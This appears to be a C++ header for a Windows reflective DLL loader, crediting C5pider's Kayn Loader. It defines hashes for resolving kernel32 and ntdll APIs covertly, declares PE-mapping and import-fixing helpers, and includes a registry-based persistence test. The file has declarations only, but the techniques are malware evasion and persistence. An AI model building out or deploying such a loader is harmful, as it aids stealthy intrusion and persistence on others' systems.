#pragma once
#include <windows.h>
#include "structs.h"



#define DLL_QUERY_HMODULE		6


/*--------------------------
    API and library hashes
--------------------------*/
#define K32 0xFD2AD9BD    // KERNEL32.DLL
#define NTLIB 0x635A68AA  // ntdll.dll 
#define GP 0xAED18BA0     // GetProcAddress
#define LLB 0x54C1D227    // LoadLibraryA
#define FLS 0x3D98C2A1    // NtFlushInstructionCache
#define NTVA 0x6E8AC28E   // NtAllocateVirtualMemory
#define NTVP 0x1DA5BB2B   // NtProtectVirtualMemory


/*---------------------------------------
    Helper function to get the DLL Base
    Taken from C5pider's Kayn Loader
---------------------------------------*/
extern "C" LPVOID KaynCaller();


/*---------------------------------------
    Helper functions for API resolving
---------------------------------------*/
HMODULE GetHand(UINT32 hashLib);
FARPROC GetAddr(HMODULE hModule, UINT32 ApiHash);
void MemCpy(LPVOID dst, LPVOID src, size_t size);
UINT32 HashA(PCHAR String, SIZE_T Length);



/*--------------------------------------------------
    Functions for mapping and fixing the loaded DLL
--------------------------------------------------*/
BOOL ParsePEHeaders(PPEHDRS pPeHdrs, LPVOID dllBaseAddress);
LPVOID PreparePEMemory(PPEHDRS pPeHdrs, PWINAPIS pWinAPIs);
BOOL FixIAT(PPEHDRS pPeHdrs, LPVOID pPEBase, PWINAPIS pWinAPIs);
void ApplyRelocations(PPEHDRS pPeHdrs, LPVOID pPEBase);
BOOL FixMemProtections(PPEHDRS pPeHdrs, LPVOID pPEBase, PWINAPIS pWinAPIs);


/*--------------------------
    DLL main entrypoint
----------------------------*/
typedef BOOL(WINAPI* DllEntry)(PVOID hMod, DWORD reason, PVOID params);


/*------------------------------------------
    Runner function for the actual payload
    Called in DllMain
------------------------------------------*/
void Runner();




/*-----------------------------------------
    Simple test for the reflective loader
    Registry modification for persistence
-----------------------------------------*/
#define ADV32 0x07862FA5    // advapi32.dll
#define cKey 0x8A4C3308     // RegCreateKeyExW
#define setVal 0x721CD57F   // RegSetValueExW
#define closeKey 0xF79985A9 // RegCloseKey

typedef LSTATUS(WINAPI* RegCreateKeyExW_t)(
    HKEY    hKey,
    LPCWSTR lpSubKey,
    DWORD   Reserved,
    LPWSTR  lpClass,
    DWORD   dwOptions,
    REGSAM  samDesired,
    const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    PHKEY   phkResult,
    LPDWORD lpdwDisposition
);

typedef LSTATUS(WINAPI* RegSetValueExW_t)(
    HKEY       hKey,
    LPCWSTR    lpValueName,
    DWORD      Reserved,
    DWORD      dwType,
    const BYTE* lpData,
    DWORD      cbData
);

typedef LSTATUS(WINAPI* RegCloseKey_t)(
    HKEY hKey
);
